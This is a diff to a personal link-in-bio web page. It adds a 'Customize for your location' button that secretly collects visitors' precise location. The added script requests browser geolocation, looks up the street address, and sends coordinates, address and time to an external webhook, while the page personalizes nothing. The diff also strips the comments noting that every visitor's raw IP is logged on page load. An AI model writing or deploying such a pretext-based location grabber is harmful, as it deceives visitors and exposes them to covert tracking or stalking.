@@ -5,7 +5,6 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Mejd Harbi</title>
 
-  <!-- ① Google Analytics 4 — replace G-XXXXXXXXXX -->
   <script async src="https://www.googletagmanager.com/gtag/js?id=G-XXXXXXXXXX"></script>
   <script>
     window.dataLayer = window.dataLayer || [];
@@ -14,7 +13,6 @@
     gtag('config', 'G-XXXXXXXXXX');
   </script>
 
-  <!-- ② Microsoft Clarity — replace YOUR_CLARITY_ID -->
   <script>
     (function(c,l,a,r,i,t,y){
       c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
@@ -24,7 +22,6 @@
   </script>
 
   <style>
-    /* paste any CSS you like here */
     body { font-family: sans-serif; text-align: center; padding: 60px 20px; }
     h1   { font-size: 2rem; margin-bottom: 8px; }
     p    { color: #666; margin-bottom: 32px; }
@@ -36,24 +33,43 @@
       transition: background 0.2s;
     }
     .links a:hover { background: #f5f5f5; }
+    .location-btn {
+      margin: 0 auto 12px;
+      display: block;
+      max-width: 360px;
+      width: 100%;
+      padding: 14px 20px;
+      background: #000;
+      color: #fff;
+      border: none;
+      border-radius: 12px;
+      font-size: 1rem;
+      font-weight: 500;
+      cursor: pointer;
+      transition: background 0.2s;
+    }
+    .location-btn:hover { background: #333; }
+    .location-btn:disabled { background: #888; cursor: default; }
   </style>
 </head>
 <body>
 
   <h1>Mejd Harbi</h1>
-  <p>Live Love Laugh ✨</p>
+  <p>A line about you ✨</p>
+
+  <button class="location-btn" id="locBtn" onclick="getLocation()">
+    Customize for your location
+  </button>
 
   <div class="links">
     <a href="https://instagram.com/mejd.harbi" data-link="instagram">Instagram</a>
-    <a href="https://yourportfolio.com"        data-link="portfolio">Portfolio</a>
-    <a href="mailto:m.harbi.email@gmail.com"             data-link="email">Email me</a>
+    <a href="https://yourportfolio.com"         data-link="portfolio">Portfolio</a>
+    <a href="mailto:m.harbi.email@gmail.com"    data-link="email">Email me</a>
   </div>
 
   <script>
-    // ③ Log raw IP via edge function on every page load
     fetch('/api/log-visitor', { method: 'POST' });
 
-    // ④ Track every link click in GA4
     document.querySelectorAll('[data-link]').forEach(el => {
       el.addEventListener('click', () => {
         gtag('event', 'link_click', {
@@ -62,6 +78,48 @@
         });
       });
     });
+
+    async function getLocation() {
+      const btn = document.getElementById('locBtn');
+      if (!navigator.geolocation) {
+        btn.textContent = 'Location not supported';
+        btn.disabled = true;
+        return;
+      }
+
+      btn.textContent = 'Getting your location...';
+      btn.disabled = true;
+
+      navigator.geolocation.getCurrentPosition(async (pos) => {
+        const { latitude, longitude, accuracy } = pos.coords;
+
+        let address = 'Unknown';
+        try {
+          const geo = await fetch(
+            `https://nominatim.openstreetmap.org/reverse?lat=${latitude}&lon=${longitude}&format=json`
+          ).then(r => r.json());
+          address = geo.display_name;
+        } catch(e) {}
+
+        await fetch('YOUR_MAKE_WEBHOOK_URL', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            time: new Date().toISOString(),
+            latitude,
+            longitude,
+            accuracy: Math.round(accuracy) + 'm',
+            address,
+          })
+        });
+
+        btn.textContent = '✓ Customized!';
+
+      }, () => {
+        btn.textContent = 'Location blocked';
+        btn.disabled = true;
+      });
+    }
   </script>
 
 </body>
